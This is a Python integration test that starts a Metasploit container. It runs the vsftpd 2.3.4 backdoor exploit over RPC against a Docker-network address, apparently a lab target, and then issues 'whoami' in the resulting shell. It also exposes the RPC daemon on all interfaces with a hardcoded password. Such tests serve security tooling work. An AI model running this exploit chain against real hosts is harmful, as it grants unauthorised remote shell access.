import asyncio
import time
import docker
from pymetasploit3.msfrpc import MsfRpcClient

async def test_official_msf():
    print("[*] Initializing Docker...")
    client = docker.from_env()
    
    print("[*] Starting official metasploit-framework container...")
    container = client.containers.run(
        "metasploitframework/metasploit-framework",
        command="./msfrpcd -P hercules123 -n -f -a 0.0.0.0",
        ports={"55553/tcp": 55553},
        detach=True,
        remove=True,
        name="msf-test"
    )
    
    print("[*] Waiting 15 seconds for msfrpcd to initialize...")
    time.sleep(15)
    
    try:
        print("[*] Connecting to msfrpcd on 127.0.0.1:55553...")
        rpc_client = MsfRpcClient("hercules123", server="127.0.0.1", port=55553, ssl=False)
        print("[+] Connected!")
        
        target_ip = "172.17.0.2"
        print(f"[*] Running vsftpd exploit against {target_ip}...")
        exploit = rpc_client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
        exploit['RHOSTS'] = target_ip
        exploit['RPORT'] = 21
        
        job = exploit.execute(payload='cmd/unix/interact')
        print(f"[*] Exploit executed, job ID: {job['job_id']}")
        
        print("[*] Waiting 10 seconds for session...")
        time.sleep(10)
        
        sessions = rpc_client.sessions.list
        if not sessions:
            print("[-] No sessions found!")
        else:
            print(f"[+] Active sessions: {sessions}")
            for session_id in sessions.keys():
                print(f"[*] Interacting with session {session_id}...")
                shell = rpc_client.sessions.session(str(session_id))
                shell.write('whoami\n')
                time.sleep(2)
                out = shell.read()
                print(f"[+] whoami Output: {out}")
                print("[+] Metasploit Session Handling Test PASS!")
                
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        print("[*] Tearing down MSF container...")
        container.stop()

if __name__ == "__main__":
    asyncio.run(test_official_msf())
